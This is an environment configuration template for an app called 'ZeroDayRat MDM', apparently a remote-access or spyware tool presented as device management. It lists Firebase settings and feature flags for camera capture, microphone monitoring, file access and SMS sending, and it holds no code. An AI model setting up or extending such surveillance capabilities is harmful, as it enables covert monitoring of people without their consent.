// Environment configuration template
# Firebase Configuration
VITE_FIREBASE_API_KEY=AIzaSyD...
VITE_FIREBASE_AUTH_DOMAIN=zerodayrat.firebaseapp.com
VITE_FIREBASE_PROJECT_ID=zerodayrat
VITE_FIREBASE_STORAGE_BUCKET=zerodayrat.appspot.com
VITE_FIREBASE_MESSAGING_SENDER_ID=123456789
VITE_FIREBASE_APP_ID=1:123456789:web:abc123
VITE_FIREBASE_DATABASE_URL=https://zerodayrat.firebaseio.com

# API Configuration
VITE_API_URL=http://localhost:3000/api
VITE_API_TIMEOUT=30000

# App Configuration
VITE_APP_NAME=ZeroDayRat MDM
VITE_APP_VERSION=1.0.0
VITE_ENABLE_LOGGING=true

# Feature Flags
VITE_ENABLE_CAMERA_CAPTURE=true
VITE_ENABLE_MICROPHONE_MONITORING=true
VITE_ENABLE_FILE_ACCESS=true
VITE_ENABLE_SMS_SENDING=true
VITE_ENABLE_REAL_TIME_SYNC=true

# Security
VITE_ENCRYPTION_KEY=your-encryption-key
VITE_SESSION_TIMEOUT=3600000

# Development
VITE_USE_FIREBASE_EMULATOR=false
